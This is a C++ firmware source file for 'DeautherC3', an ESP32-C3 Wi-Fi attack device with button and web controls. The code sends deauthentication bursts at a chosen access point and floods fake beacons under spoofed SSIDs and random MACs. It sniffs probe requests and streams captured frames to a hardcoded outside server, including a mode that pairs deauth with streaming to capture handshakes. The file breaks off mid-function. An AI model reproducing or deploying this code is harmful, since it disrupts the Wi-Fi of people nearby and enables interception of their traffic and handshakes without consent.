// mainwindow.cpp - English TFT UI with 8 pages for DeautherC3
// Web interface stays Chinese
// Button: click=navigate, double-click=select, hold=back
// Web: phone connects to AP "DeautherC3", browse 192.168.4.1
// Layout: Landscape 320x240 pixels
#include "mainwindow.h"

// Layout constants (landscape 320x240) - arrow-style compact UI
#define L_TITLE_Y    2
#define L_SUB_Y      20
#define L_INFO_Y     36
#define L_MENU_Y     52   // below info area
#define L_MENU_STEP  14   // 8px text + 6px gap
#define L_HINT_Y     228
#define L_ARROW_X    4    // '>' arrow position
#define L_ITEM_X     16    // menu item text (after arrow)

Mainwindow::Mainwindow()
{
  display_ = new Display(SCREEN_WIDTH, SCREEN_HEIGHT, TFT_RST, 0, 0, 0);
  w_utils_ = new WiFi_Utils(SET_RANDOM_MAC);
  buttons_ = new Buttons(BOOT_BUTTON_PIN);
  web_server_ = new WebServerCtrl(w_utils_);
  streamer_ = new PacketStreamer();
}

Mainwindow::~Mainwindow()
{
  delete display_;
  delete w_utils_;
  delete buttons_;
  delete web_server_;
  delete streamer_;
}

// ============== INIT ==============

void Mainwindow::init()
{
  Serial.println("[MAIN] Initializing...");

  bool display_ok = display_->startDisplay();
  if (!display_ok) {
    Serial.println("[MAIN] WARNING: Display not available");
  }

  // Boot screen (English)
  Adafruit_ST7789& tft = display_->getTft();
  tft.fillScreen(ST77XX_BLACK);
  // Title
  tft.setTextSize(2);
  tft.setTextColor(ST77XX_WHITE);
  tft.setCursor(80, L_TITLE_Y);
  tft.print("DeautherC3");
  // Subtitle
  display_->drawText("LCKFB ESP32-C3", 100, L_SUB_Y, 1, ST77XX_RED);
  // Status line 1
  display_->drawText("Starting...", 4, 34, 1, ST77XX_WHITE);

  if (SET_RANDOM_MAC) {
    display_->drawText("MAC:", 4, 48, 1, ST77XX_YELLOW);
    tft.setCursor(52, 48);
    tft.setTextSize(1);
    tft.setTextColor(ST77XX_YELLOW);
  }

  w_utils_->init();
  if (w_utils_->isInit) {
    if (display_ok) {
      tft.println(w_utils_->macAddress().c_str());
      display_->drawText("Scanning...", 4, 62, 1, ST77XX_WHITE);
    }
    w_utils_->wifi_list = w_utils_->scanWifiList();
    Serial.printf("[MAIN] Found %d networks\n", w_utils_->wifi_list.num);
  } else {
    Serial.println("[MAIN] WiFi init failed!");
  }

  // Start Web server (AP+STA mode)
  web_server_->init();

  // 尝试连接已保存的 WiFi（非阻塞）
  Serial.println("[MAIN] Trying to connect saved WiFi...");
  web_server_->tryConnectWiFi();
  // 等待 3 秒看是否快速连接成功
  unsigned long start = millis();
  while (millis() - start < 3000 && WiFi.status() != WL_CONNECTED) {
    delay(100);
  }
  if (WiFi.status() == WL_CONNECTED) {
    Serial.print("[MAIN] WiFi STA connected! IP: ");
    Serial.println(WiFi.localIP());
    if (display_ok) {
      display_->drawText("WiFi: Connected ", 4, 106, 1, ST77XX_GREEN);
      tft.setCursor(4, 120);
      tft.setTextSize(1);
      tft.setTextColor(ST77XX_GREEN);
      tft.println(WiFi.localIP());
    }
  } else {
    Serial.println("[MAIN] WiFi STA not connected (will retry in background)");
  }

  if (display_ok) {
    display_->drawText("AP: DeautherC3", 4, 76, 1, ST77XX_WHITE);
    tft.setCursor(4, 90);
    tft.setTextSize(1);
    tft.setTextColor(ST77XX_WHITE);
    tft.println("192.168.4.1");
    display_->drawText("Web: esp.yuanru.fun", 4, 154, 1, ST77XX_CYAN);
  }
  delay(1500);

  buttons_->init();

  // Configure packet streamer - use WiFi_Utils to get STA IP
  // The streamer will use WiFi STA when available, AP otherwise
  streamer_->setServer("38.244.14.175", 9999);
  // WiFi credentials are now managed by WebServerCtrl via Preferences
  // streamer will auto-use STA when connected

  // Link streamer to sniffer so captured frames get pushed to buffer
  w_utils_->setPacketStreamer(streamer_);

  setMainPage();
  Serial.println("[MAIN] Init complete, entering main loop");
}

// ============== LOOP ==============

void Mainwindow::loop()
{
  // Always handle web requests first
  web_server_->handleClient();
  web_server_->loop();

  // AP keepalive: if mode got reset (e.g. by scan), restart AP
  static unsigned long last_ap_check = 0;
  if (millis() - last_ap_check >= 3000) {
    last_ap_check = millis();
    if (WiFi.getMode() != WIFI_AP_STA) {
      Serial.println("[MAIN] AP lost! Restarting AP...");
      WiFi.mode(WIFI_AP_STA);
      WiFi.softAP(AP_SSID, AP_PASSWORD, AP_CHANNEL);
    }
  }

  // Sync web state with local state
  syncWebState();

  // Channel hopping (always active if set)
  if (w_utils_->isChannelHopping()) {
    w_utils_->hopChannel();
  }

  // Packet streamer - send buffered packets to server
  if (streaming_active) {
    streamer_->loop();
  }

  // COEXISTENCE: Deauth + Streaming together (handshake capture mode)
  if (attack_running && attack_state == ATK_DEAUTH && streaming_active && sniffer_active) {
    runDeauthAttack();
    static unsigned long last_combo_upd = 0;
    if (millis() - last_combo_upd >= 2000) {
      updateStreamerDeauthDisplay();
      last_combo_upd = millis();
    }
    int action = buttons_->readButtons();
    if (action == BTN_SEL) {
      stopDeauthOnly();
      updateStreamerDisplay();
      return;
    }
    if (action == BTN_BACK) {
      stopAllActivities();
      page = PAGE_SNIFFER;
      cursor_index = 0;
      setSnifferPage();
      return;
    }
    return;
  }

  // Running deauth attack - send packets and update display
  if (attack_running && attack_state == ATK_DEAUTH) {
    runDeauthAttack();
    int action = buttons_->readButtons();
    if (action == BTN_BACK || action == BTN_SEL) {
      stopAllActivities();
      page = PAGE_ATTACK;
      cursor_index = 0;
      setAttackPage();
      return;
    }
    return;
  }

  // Running beacon flood
  if (beacon_active) {
    runBeaconFlood();
    int action = buttons_->readButtons();
    if (action == BTN_BACK || action == BTN_SEL) {
      stopAllActivities();
      page = PAGE_BEACON;
      cursor_index = 0;
      setBeaconPage();
      return;
    }
    return;
  }

  // Running packet streaming to server
  if (streaming_active && sniffer_active) {
    streamer_->loop();
    static unsigned long last_stream_upd = 0;
    if (millis() - last_stream_upd >= 2000) {
      updateStreamerDisplay();
      last_stream_upd = millis();
    }
    int action = buttons_->readButtons();
    if (action == BTN_BACK) {
      stopStreaming();
      page = PAGE_SNIFFER;
      cursor_index = 0;
      setSnifferPage();
      return;
    }
    if (action == BTN_SEL) {
      // Start deauth alongside streaming (handshake capture)
      if (selected_target >= 0 && selected_target < w_utils_->wifi_list.num) {
        attack_state = ATK_DEAUTH;
        attack_running = true;
        attack_packet_count = 0;
        deauth_while_streaming = true;
        web_server_->setAttackRunning(true);
        uint8_t tch = w_utils_->wifi_list.channel[selected_target];
        esp_wifi_set_channel(tch, WIFI_SECOND_CHAN_NONE);
        Serial.printf("[STREAM+ATK] Deauth alongside streaming: %s ch=%d\n",
          w_utils_->wifi_list.ssid[selected_target].c_str(), tch);
      }
      return;
    }
    return;
  }

  // Sniffer running - periodic display update
  static unsigned long last_sniffer_upd = 0;
  if (sniffer_active) {
    if (millis() - last_sniffer_upd >= 2000) {
      updateSnifferDisplay();
      last_sniffer_upd = millis();
    }
    int action = buttons_->readButtons();
    if (action == BTN_BACK) {
      stopAllActivities();
      page = PAGE_SNIFFER;
      cursor_index = 0;
      setSnifferPage();
      return;
    }
    return;
  }

  // Probe sniffer running - periodic display update
  static unsigned long last_probe_upd = 0;
  if (probe_active) {
    if (millis() - last_probe_upd >= 2000) {
      updateProbeDisplay();
      last_probe_upd = millis();
    }
    int action = buttons_->readButtons();
    if (action == BTN_BACK) {
      stopAllActivities();
      page = PAGE_PROBE;
      cursor_index = 0;
      setProbePage();
      return;
    }
    return;
  }

  // Normal button navigation (no activity running)
  int action = buttons_->readButtons();
  if (action == BTN_NONE) return;

  Serial.print("[MAIN] Button: ");
  switch (action) {
    case BTN_NAV:  Serial.println("NAV"); break;
    case BTN_SEL:  Serial.println("SEL"); break;
    case BTN_BACK: Serial.println("BACK"); break;
  }

  switch (page)
  {
    case PAGE_MAIN:    handleMainPage(action); break;
    case PAGE_SELECT:  handleSelectPage(action); break;
    case PAGE_SCAN:    handleScanPage(action); break;
    case PAGE_ATTACK:  handleAttackPage(action); break;
    case PAGE_SNIFFER: handleSnifferPage(action); break;
    case PAGE_BEACON:  handleBeaconPage(action); break;
    case PAGE_PROBE:   handleProbePage(action); break;
    case PAGE_INFO:    handleInfoPage(action); break;
  }
}

// ============== WEB SYNC ==============

void Mainwindow::syncWebState()
{
  // Attack sync
  if (web_server_->getAttackRunning() && !attack_running) {
    if (streaming_active && sniffer_active) {
      // COEXISTENCE: Start deauth alongside streaming
      attack_running = true;
      attack_state = ATK_DEAUTH;
      attack_packet_count = 0;
      deauth_while_streaming = true;
      selected_target = web_server_->getSelectedTarget();
      uint8_t tch = w_utils_->wifi_list.channel[selected_target];
      esp_wifi_set_channel(tch, WIFI_SECOND_CHAN_NONE);
      Serial.println("[MAIN] Attack started via web alongside streaming");
    } else {
      stopAllActivities();
      attack_running = true;
      attack_state = ATK_DEAUTH;
      attack_packet_count = 0;
      selected_target = web_server_->getSelectedTarget();
      page = PAGE_ATTACK;
      Serial.println("[MAIN] Attack started via web");
    }
  }
  if (!web_server_->getAttackRunning() && attack_running) {
    if (streaming_active) {
      stopDeauthOnly();
      Serial.println("[MAIN] Attack stopped via web (streaming continues)");
    } else {
      attack_running = false;
      attack_state = ATK_IDLE;
      Serial.println("[MAIN] Attack stopped via web");
      if (page == PAGE_ATTACK) setAttackPage();
    }
  }

  // Sniffer sync
  if (web_server_->getSnifferRunning() && !sniffer_active) {
    stopAllActivities();
    sniffer_active = true;
    w_utils_->resetSnifferStats();
    w_utils_->startSniffer(web_server_->getSnifferChannel());
    page = PAGE_SNIFFER;
    Serial.println("[MAIN] Sniffer started via web");
  }
  if (!web_server_->getSnifferRunning() && sniffer_active) {
    w_utils_->stopSniffer();
    sniffer_active = false;
    Serial.println("[MAIN] Sniffer stopped via web");
    if (page == PAGE_SNIFFER) setSnifferPage();
  }

  // Beacon sync
  if (web_server_->getBeaconRunning() && !beacon_active) {
    stopAllActivities();
    beacon_active = true;
    selected_target = web_server_->getSelectedTarget();
    w_utils_->startBeaconFlood(web_server_->getBeaconChannel());
    page = PAGE_BEACON;
    Serial.println("[MAIN] Beacon flood started via web");
  }
  if (!web_server_->getBeaconRunning() && beacon_active) {
    w_utils_->stopBeaconFlood();
    beacon_active = false;
    Serial.println("[MAIN] Beacon flood stopped via web");
    if (page == PAGE_BEACON) setBeaconPage();
  }

  // Probe sync
  if (web_server_->getProbeRunning() && !probe_active) {
    stopAllActivities();
    probe_active = true;
    w_utils_->resetProbeData();
    w_utils_->startProbeSniffer(web_server_->getProbeChannel());
    page = PAGE_PROBE;
    Serial.println("[MAIN] Probe sniffer started via web");
  }
  if (!web_server_->getProbeRunning() && probe_active) {
    w_utils_->stopProbeSniffer();
    probe_active = false;
    Serial.println("[MAIN] Probe sniffer stopped via web");
    if (page == PAGE_PROBE) setProbePage();
  }

  // Target sync
  if (web_server_->getSelectedTarget() >= 0 && web_server_->getSelectedTarget() != selected_target) {
    selected_target = web_server_->getSelectedTarget();
    Serial.printf("[MAIN] Target set via web: %s\n", w_utils_->wifi_list.ssid[selected_target].c_str());
  }

  // Channel hopping sync
  if (web_server_->getChannelHopping() && !channel_hopping) {
    w_utils_->startChannelHopper();
    channel_hopping = true;
  }
  if (!web_server_->getChannelHopping() && channel_hopping) {
    w_utils_->stopChannelHopper();
    channel_hopping = false;
  }

  // Streaming sync
  if (web_server_->getStreamingRunning() && !streaming_active) {
    stopAllActivities();
    startStreaming();
    Serial.println("[MAIN] Streaming started via web");
  }
  if (!web_server_->getStreamingRunning() && streaming_active) {
    // If deauth was running alongside, stop it too (sniffer going away)
    if (deauth_while_streaming) {
      stopDeauthOnly();
    }
    stopStreaming();
    Serial.println("[MAIN] Streaming stopped via web");
  }
  if (streaming_active) {
    web_server_->setStreamingPackets(streamer_->getPacketsSent());
  }

  // Sniffer filter sync
  String web_filter = web_server_->getSnifferFilterMacStr();
  if (web_filter.length() > 0 && !w_utils_->isSnifferFiltered()) {
    w_utils_->setSnifferFilterFromStr(web_filter.c_str());
  }
  if (web_filter.length() == 0 && w_utils_->isSnifferFiltered()) {
    w_utils_->clearSnifferFilter();
  }

  // Packet count sync
  if (attack_running) {
    web_server_->setAttackPacketCount(attack_packet_count);
  }
}

// ============== STOP ALL ==============

void Mainwindow::stopAllActivities()
{
  if (attack_running) {
    attack_running = false;
    attack_state = ATK_IDLE;
    web_server_->setAttackRunning(false);
  }
  if (sniffer_active) {
    w_utils_->stopSniffer();
    sniffer_active = false;
    web_server_->setSnifferRunning(false);
  }
  if (beacon_active) {
    w_utils_->stopBeaconFlood();
    beacon_active = false;
    web_server_->setBeaconRunning(false);
  }
  if (probe_active) {
    w_utils_->stopProbeSniffer();
    probe_active = false;
    web_server_->setProbeRunning(false);
  }
  if (channel_hopping) {
    w_utils_->stopChannelHopper();
    channel_hopping = false;
    web_server_->setChannelHopping(false);
  }
  if (streaming_active) {
    stopStreaming();  // stopStreaming() now syncs web state internally
  }
  deauth_while_streaming = false;
}

void Mainwindow::stopDeauthOnly()
{
  if (attack_running) {
    attack_running = false;
    attack_state = ATK_IDLE;
    attack_packet_count = 0;
    web_server_->setAttackRunning(false);
  }
  deauth_while_streaming = false;
}

void Mainwindow::handleBack()
{
  stopAllActivities();
  cursor_index = 0;
  page = PAGE_MAIN;
  setMainPage();
}

// ============== MAIN PAGE ==============

void Mainwindow::handleMainPage(int action)
{
  switch (action) {
    case BTN_NAV:  handleMainPageNav(); break;
    case BTN_SEL:  handleMainPageSel(); break;
    case BTN_BACK: break;  // Already at top level
  }
}

void Mainwindow::setMainPage()
{
  page = PAGE_MAIN;
  Adafruit_ST7789& tft = display_->getTft();
  tft.fillScreen(ST77XX_BLACK);

  // Title
  tft.setTextSize(2);
  tft.setTextColor(ST77XX_WHITE);
  tft.setCursor(80, L_TITLE_Y);
  tft.print("DeautherC3");

  // Subtitle
  display_->drawText("LCKFB ESP32-C3", 100, L_SUB_Y, 1, ST77XX_RED);

  // Target info
  if (selected_target >= 0 && selected_target < w_utils_->wifi_list.num) {
    std::string t = "Target: " + w_utils_->wifi_list.ssid[selected_target];
    if (t.length() > 40) t = t.substr(0, 40);
    display_->drawText(t.c_str(), 4, L_INFO_Y, 1, ST77XX_YELLOW);
  } else {
    display_->drawText("No Target", 4, L_INFO_Y, 1, ST77XX_YELLOW);
  }

  // Menu items
  const char* menu_items[] = {"Select Target", "Scan Networks", "Attack Menu", "Sniffer", "Device Info"};
  tft.setTextSize(1);
  for (int i = 0; i < MAIN_MENU_COUNT; i++) {
    int y = L_MENU_Y + i * L_MENU_STEP;
    tft.setCursor(L_ARROW_X, y);
    if (i == cursor_index) {
      tft.setTextColor(ST77XX_WHITE);
      tft.print(">");
      display_->drawText(menu_items[i], L_ITEM_X, y, 1, ST77XX_WHITE);
    } else {
      tft.setTextColor(ST77XX_CYAN);
      tft.print(" ");
      display_->drawText(menu_items[i], L_ITEM_X, y, 1, ST77XX_CYAN);
    }
  }

  // Hint
  display_->drawText("[1]Nav [2x]Sel [H]Back", 4, L_HINT_Y, 1, ST77XX_CYAN);

  // AP info at bottom right
  display_->drawText("192.168.4.1", 200, L_HINT_Y, 1, ST77XX_GREEN);
}

void Mainwindow::handleMainPageNav()
{
  cursor_index = (cursor_index + 1) % MAIN_MENU_COUNT;
  setMainPage();
}

void Mainwindow::handleMainPageSel()
{
  switch (cursor_index) {
    case 0:  // Select Target
      if (w_utils_->wifi_list.num == 0) {
        display_->drawTextClear("Scanning...", 4, 60, 2, ST77XX_WHITE);
        w_utils_->wifi_list = w_utils_->scanWifiList();
        if (w_utils_->wifi_list.num == 0) {
          display_->drawText("No Networks!", 4, 100, 2, ST77XX_RED);
          delay(1000);
          setMainPage();
          return;
        }
      }
      cursor_index = 0;
      setSelectPage();
      break;
    case 1:  // Scan Networks
      cursor_index = 0;
      setScanPage();
      break;
    case 2:  // Attack Menu
      cursor_index = 0;
      setAttackPage();
      break;
    case 3:  // Sniffer
      cursor_index = 0;
      setSnifferPage();
      break;
    case 4:  // Device Info
      cursor_index = 0;
      setInfoPage();
      break;
  }
}

// ============== SELECT TARGET PAGE ==============

void Mainwindow::handleSelectPage(int action)
{
  switch (action) {
    case BTN_NAV:  handleSelectPageNav(); break;
    case BTN_SEL:  handleSelectPageSel(); break;
    case BTN_BACK: handleBack(); break;
  }
}

void Mainwindow::setSelectPage()
{
  page = PAGE_SELECT;
  Adafruit_ST7789& tft = display_->getTft();
  tft.fillScreen(ST77XX_BLACK);

  display_->drawText("Select Target", 90, 2, 2, ST77XX_WHITE);

  if (selected_target >= 0 && selected_target < w_utils_->wifi_list.num) {
    std::string cur = "Current: " + w_utils_->wifi_list.ssid[selected_target];
    if (cur.length() > 40) cur = cur.substr(0, 40);
    display_->drawText(cur.c_str(), 4, 36, 1, ST77XX_GREEN);
  }

  if (w_utils_->wifi_list.num == 0) {
    display_->drawText("No Networks", 4, 56, 2, ST77XX_RED);
    display_->drawText("[2x/H]Back", 4, L_HINT_Y, 1, ST77XX_CYAN);
    return;
  }

  // Show WiFi list with arrow style
  int max_show = 10;
  int start = (cursor_index > max_show - 1) ? cursor_index - max_show + 1 : 0;
  tft.setTextSize(1);
  for (int i = start; i < w_utils_->wifi_list.num && i - start < max_show; i++) {
    int y = L_MENU_Y + (i - start) * L_MENU_STEP;
    tft.setCursor(L_ARROW_X, y);
    if (i == cursor_index) {
      tft.setTextColor(ST77XX_WHITE);
      tft.print(">");
      std::string line = std::to_string(i + 1) + "." + w_utils_->wifi_list.ssid[i];
      if (line.length() > 40) line = line.substr(0, 40);
      display_->drawText(line.c_str(), L_ITEM_X, y, 1, ST77XX_WHITE);
    } else {
      tft.setTextColor(ST77XX_CYAN);
      tft.print(" ");
      std::string line = std::to_string(i + 1) + "." + w_utils_->wifi_list.ssid[i];
      if (line.length() > 40) line = line.substr(0, 40);
      display_->drawText(line.c_str(), L_ITEM_X, y, 1, ST77XX_CYAN);
    }
  }

  display_->drawText("[1]Nav [2x]Sel [H]Back", 4, L_HINT_Y, 1, ST77XX_CYAN);
}

void Mainwindow::handleSelectPageNav()
{
  if (w_utils_->wifi_list.num > 0) {
    cursor_index = (cursor_index + 1) % w_utils_->wifi_list.num;
    setSelectPage();
  }
}

void Mainwindow::handleSelectPageSel()
{
  if (w_utils_->wifi_list.num == 0) {
    w_utils_->wifi_list = w_utils_->scanWifiList();
    cursor_index = 0;
    setSelectPage();
    return;
  }
  selected_target = cursor_index;
  web_server_->setSelectedTarget(selected_target);
  Serial.printf("[SEL] Target: %s\n", w_utils_->wifi_list.ssid[selected_target].c_str());

  // Show confirmation
  Adafruit_ST7789& tft = display_->getTft();
  tft.fillScreen(ST77XX_BLACK);
  display_->drawText("Target Selected!", 50, 2, 2, ST77XX_GREEN);
  std::string ssid = w_utils_->wifi_list.ssid[selected_target];
  if (ssid.length() > 30) ssid = ssid.substr(0, 30);
  display_->drawText(ssid.c_str(), 4, 40, 2, ST77XX_WHITE);
  std::string ch_info = "Ch: " + std::to_string(w_utils_->wifi_list.channel[selected_target]);
  display_->drawText(ch_info.c_str(), 4, 76, 2, ST77XX_YELLOW);
  delay(1500);
  handleBack();
}

// ============== SCAN PAGE ==============

void Mainwindow::handleScanPage(int action)
{
  switch (action) {
    case BTN_NAV:  handleScanPageNav(); break;
    case BTN_SEL:  handleScanPageSel(); break;
    case BTN_BACK: handleBack(); break;
  }
}

void Mainwindow::setScanPage()
{
  page = PAGE_SCAN;
  Adafruit_ST7789& tft = display_->getTft();
  tft.fillScreen(ST77XX_BLACK);

  display_->drawText("Scan Networks", 80, 2, 2, ST77XX_WHITE);
  std::string found = "Found: " + std::to_string(w_utils_->wifi_list.num) + " networks";
  display_->drawText(found.c_str(), 4, 36, 1, ST77XX_YELLOW);

  if (w_utils_->wifi_list.num == 0) {
    display_->drawText("No Networks", 4, 56, 2, ST77XX_RED);
  } else {
    // Show list with detail
    int row_y = 54;
    for (int i = cursor_index; i < w_utils_->wifi_list.num && row_y < 210; i++) {
      std::string line = std::to_string(i + 1) + "." + w_utils_->wifi_list.ssid[i]
                        + " Ch:" + std::to_string(w_utils_->wifi_list.channel[i])
                        + " " + std::to_string((int)w_utils_->wifi_list.signal[i]) + "dBm";
      if (line.length() > 50) line = line.substr(0, 50);

      if (i == cursor_index) {
        tft.fillRect(0, row_y, 320, 16, ST77XX_RED);
      }
      tft.setTextSize(1);
      tft.setTextColor(ST77XX_WHITE);
      tft.setCursor(2, row_y);
      tft.print(line.c_str());
      row_y += 16;
    }
  }

  display_->drawText("[1]Nav [2x]Rescan [H]Back", 4, L_HINT_Y, 1, ST77XX_CYAN);
}

void Mainwindow::handleScanPageNav()
{
  if (w_utils_->wifi_list.num > 0) {
    cursor_index = (cursor_index + 1) % w_utils_->wifi_list.num;
  }
  setScanPage();
}

void Mainwindow::handleScanPageSel()
{
  // Rescan
  display_->drawTextClear("Scanning...", 4, 60, 2, ST77XX_WHITE);
  w_utils_->wifi_list = w_utils_->scanWifiList();
  cursor_index = 0;
  setScanPage();
}

// ============== ATTACK PAGE ==============

void Mainwindow::handleAttackPage(int action)
{
  if (attack_running || beacon_active) {
    if (action == BTN_BACK || action == BTN_SEL) {
      stopAllActivities();
      setAttackPage();
    }
    return;
  }
  switch (action) {
    case BTN_NAV:  handleAttackPageNav(); break;
    case BTN_SEL:  handleAttackPageSel(); break;
    case BTN_BACK: handleBack(); break;
  }
}

void Mainwindow::setAttackPage()
{
  page = PAGE_ATTACK;
  Adafruit_ST7789& tft = display_->getTft();
  tft.fillScreen(ST77XX_BLACK);

  display_->drawText("Attack Menu", 80, 2, 2, ST77XX_RED);

  if (selected_target < 0 || selected_target >= w_utils_->wifi_list.num) {
    display_->drawText("No Target! Select First", 4, 36, 1, ST77XX_YELLOW);
    display_->drawText("[H]Back", 4, L_HINT_Y, 1, ST77XX_CYAN);
    return;
  }

  // Target info
  std::string tgt = "Target: " + w_utils_->wifi_list.ssid[selected_target];
  if (tgt.length() > 40) tgt = tgt.substr(0, 40);
  display_->drawText(tgt.c_str(), 4, 36, 1, ST77XX_YELLOW);

  // Attack menu items
  const char* atk_items[] = {"Deauth", "Beacon Flood", "Probe Req", "Stop Attack", "Back"};
  tft.setTextSize(1);
  for (int i = 0; i < ATK_MENU_COUNT; i++) {
    int y = L_MENU_Y + i * L_MENU_STEP;
    tft.setCursor(L_ARROW_X, y);
    if (i == cursor_index) {
      tft.setTextColor(ST77XX_WHITE);
      tft.print(">");
      display_->drawText(atk_items[i], L_ITEM_X, y, 1, ST77XX_WHITE);
    } else {
      tft.setTextColor(ST77XX_CYAN);
      tft.print(" ");
      display_->drawText(atk_items[i], L_ITEM_X, y, 1, ST77XX_CYAN);
    }
  }

  display_->drawText("[1]Nav [2x]Sel [H]Back", 4, L_HINT_Y, 1, ST77XX_CYAN);
}

void Mainwindow::handleAttackPageNav()
{
  cursor_index = (cursor_index + 1) % ATK_MENU_COUNT;
  setAttackPage();
}

void Mainwindow::handleAttackPageSel()
{
  switch (cursor_index) {
    case 0:  // Deauth
      if (selected_target >= 0) {
        if (streaming_active && sniffer_active) {
          // COEXISTENCE: Start deauth alongside streaming
          // Do NOT stop streaming or sniffer!
          attack_state = ATK_DEAUTH;
          attack_running = true;
          attack_packet_count = 0;
          deauth_while_streaming = true;
          web_server_->setAttackRunning(true);
          uint8_t tch = w_utils_->wifi_list.channel[selected_target];
          esp_wifi_set_channel(tch, WIFI_SECOND_CHAN_NONE);
          Serial.printf("[ATK] Deauth alongside streaming: %s ch=%d bssid=%s\n",
            w_utils_->wifi_list.ssid[selected_target].c_str(), tch,
            w_utils_->wifi_list.bssid[selected_target].c_str());
        } else {
          // STANDALONE: Stop everything then start deauth
          stopAllActivities();
          esp_wifi_set_mode(WIFI_MODE_APSTA);
          WiFi.mode(WIFI_AP_STA);
          attack_state = ATK_DEAUTH;
          attack_running = true;
          attack_packet_count = 0;
          web_server_->setAttackRunning(true);
          uint8_t tch = w_utils_->wifi_list.channel[selected_target];
          esp_wifi_set_channel(tch, WIFI_SECOND_CHAN_NONE);
          Serial.printf("[ATK] Start deauth: %s ch=%d bssid=%s\n",
            w_utils_->wifi_list.ssid[selected_target].c_str(), tch,
            w_utils_->wifi_list.bssid[selected_target].c_str());
        }
      }
      break;
    case 1:  // Beacon Flood
      if (selected_target >= 0) {
        stopAllActivities();
        beacon_active = true;
        w_utils_->startBeaconFlood(w_utils_->wifi_list.channel[selected_target]);
        web_server_->setBeaconRunning(true);
        web_server_->setBeaconChannel(w_utils_->wifi_list.channel[selected_target]);
        page = PAGE_BEACON;
        cursor_index = 0;
        updateBeaconDisplay();  // 立即显示运行界面，而不是菜单
      }
      break;
    case 2:  // Probe Request
    {
      stopAllActivities();
      probe_active = true;
      w_utils_->resetProbeData();
      uint8_t ch = (selected_target >= 0) ? w_utils_->wifi_list.channel[selected_target] : 6;
      w_utils_->startProbeSniffer(ch);
      web_server_->setProbeRunning(true);
      web_server_->setProbeChannel(ch);
      page = PAGE_PROBE;
      cursor_index = 0;
      setProbePage();
      break;
    }
    case 3:  // Stop Attack
      stopAllActivities();
      setAttackPage();
      break;
    case 4:  // Back
      handleBack();
      break;
  }
}

void Mainwindow::runDeauthAttack()
{
  if (selected_target < 0 || selected_target >= w_utils_->wifi_list.num) return;

  Adafruit_ST7789& tft = display_->getTft();
  uint8_t bssid_bytes[6];
  parseBSSID(w_utils_->wifi_list.bssid[selected_target], bssid_bytes);
  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

  // Set channel to target's channel
  uint8_t target_ch = w_utils_->wifi_list.channel[selected_target];
  esp_wifi_set_channel(target_ch, WIFI_SECOND_CHAN_NONE);
  delay(5);  // Let radio settle

  // Send burst of deauth packets (20 groups x 4 frames = 80 frames per call)
  for (int i = 0; i < 20; i++) {
    w_utils_->sendDeauthPacket(bssid_bytes, broadcast);
    attack_packet_count++;
    Serial.printf("[ATK] Sent packet #%lu\n", attack_packet_count);
    // Small yield to prevent watchdog reset
    if (i % 3 == 0) delay(1);
  }

  // Update display every 100 packets
  if (attack_packet_count % 100 < 20) {
    tft.fillScreen(ST77XX_BLACK);
    display_->drawText("DEAUTH ATTACK!", 50, 2, 2, ST77XX_RED);
    std::string ssid = w_utils_->wifi_list.ssid[selected_target];
    if (ssid.length() > 20) ssid = ssid.substr(0, 20);
    display_->drawText(ssid.c_str(), 4, 40, 2, ST77XX_WHITE);
    std::string pkts = "Packets: " + std::to_string(attack_packet_count);
    display_->drawText(pkts.c_str(), 4, 76, 2, ST77XX_YELLOW);
    // Show channel info
    std::string ch_str = "Channel: " + std::to_string(target_ch);
    display_->drawText(ch_str.c_str(), 4, 108, 1, ST77XX_CYAN);

    display_->drawText("[2x/H] Stop", 4, L_HINT_Y, 1, ST77XX_CYAN);
  }

  // First-run debug output
  if (attack_packet_count <= 20) {
    Serial.printf("[ATK] Ch=%d BSSID=%s SSID=%s pkts=%d\n",
      target_ch,
      w_utils_->wifi_list.bssid[selected_target].c_str(),
      w_utils_->wifi_list.ssid[selected_target].c_str(),
      attack_packet_count);
  }
}

void Mainwindow::runBeaconFlood()
{
  if (selected_target < 0 || selected_target >= w_utils_->wifi_list.num) return;

  uint8_t target_ch = w_utils_->wifi_list.channel[selected_target];
  esp_wifi_set_channel(target_ch, WIFI_SECOND_CHAN_NONE);

  // 16 个不同的假 SSID，用于泛洪
  const char* beacon_names[] = {
    "FREE_WIFI", "ChinaNet-5G", "WiFi_C3", "Guest_WiFi",
    "TP-LINK_123", "HUAWEI-5G", "Netcore_666", "FAST_WIFI",
    "Linksys_24G", "Dlink_WiFi", "ASUS_5G", "Xiaomi_WiFi",
    "Mercury_WiFi", "Tenda_123", "WiFi_6_Pro", "OpenNet"
  };
  const int NAME_COUNT = 16;

  // 每次循环发 8 个信标，真正泛洪
  for (int i = 0; i < 8; i++) {
    uint8_t fake_bssid[6];
    for (int j = 0; j < 6; j++) fake_bssid[j] = random(0, 256);
    fake_bssid[0] = (fake_bssid[0] & 0xFC) | 0x02;  // 本地管理位

    int name_idx = (w_utils_->getBeaconFloodCount() + i) % NAME_COUNT;
    w_utils_->sendBeaconFrame(beacon_names[name_idx], fake_bssid, target_ch);
    w_utils_->incrementBeaconFloodCount();
  }

  uint32_t count = w_utils_->getBeaconFloodCount();
  web_server_->setAttackPacketCount(count);

  // 每 5 次循环更新一次屏幕（约几百毫秒一次）
  static int update_counter = 0;
  if (++update_counter >= 5) {
    update_counter = 0;
    updateBeaconDisplay();
  }

  delay(2);  // 稍微延迟，让射频稳定
}

// ============== SNIFFER PAGE ==============

void Mainwindow::handleSnifferPage(int action)
{
  if (sniffer_active) {
    if (action == BTN_BACK) {
      stopAllActivities();
      setSnifferPage();
    }
    return;
  }
  switch (action) {
    case BTN_NAV:  handleSnifferPageNav(); break;
    case BTN_SEL:  handleSnifferPageSel(); break;
    case BTN_BACK: handleBack(); break;
  }
}

void Mainwindow::setSnifferPage()
{
  page = PAGE_SNIFFER;
  Adafruit_ST7789& tft = display_->getTft();
  tft.fillScreen(ST77XX_BLACK);

  display_->drawText("Sniffer", 100, 2, 2, ST77XX_WHITE);

  const char* sniffer_items[] = {"Start Sniff", "Channel Hop", "Full Channel Hop", "Stream to Server", "Back"};
  int item_count = 5;
  tft.setTextSize(1);
  for (int i = 0; i < item_count; i++) {
    int y = L_MENU_Y + i * L_MENU_STEP;
    tft.setCursor(L_ARROW_X, y);
    if (i == cursor_index) {
      tft.setTextColor(ST77XX_WHITE);
      tft.print(">");
      display_->drawText(sniffer_items[i], L_ITEM_X, y, 1, ST77XX_WHITE);
    } else {
      tft.setTextColor(ST77XX_CYAN);
      tft.print(" ");
      display_->drawText(sniffer_items[i], L_ITEM_X, y, 1, ST77XX_CYAN);
    }
  }

  // Show current channel
